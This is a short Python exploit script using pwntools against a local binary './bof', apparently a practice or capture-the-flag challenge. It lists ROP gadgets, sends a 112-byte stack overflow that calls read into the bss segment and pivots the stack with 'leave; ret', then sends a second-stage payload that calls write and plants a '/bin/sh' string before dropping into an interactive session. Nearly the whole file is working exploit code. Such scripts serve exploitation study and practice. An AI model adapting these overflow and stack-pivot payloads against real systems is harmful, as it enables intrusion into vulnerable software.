#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
context.log_level = 'debug'
context.terminal = ['deepin-terminal', '-x', 'sh', '-c']

elf = ELF("./bof")
io = process("./bof")
raw_input("DEBUG: ")
gdb.attach(io)

'''
[INFO] File: ./bof
0x080485be: pop ebp; lea esp, dword ptr [ecx - 4]; ret;
0x08048518: pop ebp; cld; leave; ret;
0x0804862b: pop ebp; ret;
0x080485bc: pop ebx; pop edi; pop ebp; lea esp, dword ptr [ecx - 4]; ret;
0x08048628: pop ebx; pop esi; pop edi; pop ebp; ret;
0x0804836d: pop ebx; ret;
0x080485bb: pop ecx; pop ebx; pop edi; pop ebp; lea esp, dword ptr [ecx - 4]; ret;
0x080485bd: pop edi; pop ebp; lea esp, dword ptr [ecx - 4]; ret;
0x0804862a: pop edi; pop ebp; ret;
0x08048629: pop esi; pop edi; pop ebp; ret;
0x0804846e: ret 0xeac1;
0x080485c0: popal; cld; ret;
0x08048356: ret;

[INFO] File: ./bof
0x0804846e: ret 0xeac1;
0x08048445: leave; ret;
0x08048356: ret;
'''
payload = 'a' * 112
payload += p32(elf.plt['read'])
payload += p32(0x08048629)
payload += p32(0)
payload += p32(elf.bss() + 0x800)
payload += p32(0x100)
payload += p32(0x0804862b)
payload += p32(elf.bss() + 0x800)
payload += p32(0x08048445)
io.sendlineafter("!\n", payload)
'''
+------------+
|aaaa        |
|....        |
+------------+
|read@plt    |
+------------+
|pppr        |
+------------+
|0           |
+------------+
|bss + 0x800 |
+------------+
|0x100       |
+------------+
|pop ebp; ret|
+------------+
|bss + 0x800 |
+------------+
|leave ret   |
+------------+
'''

payload = 'AAAA'
payload += p32(elf.plt['write'])
payload += 'AAAA'
payload += p32(1)
payload += p32(elf.bss() + 0x800 + 0x80)
payload = payload.ljust(0x80, 'A')
payload += "/bin/sh\0"
payload = payload.ljust(0x100, 'A')
io.sendline(payload)

io.interactive()
io.close()
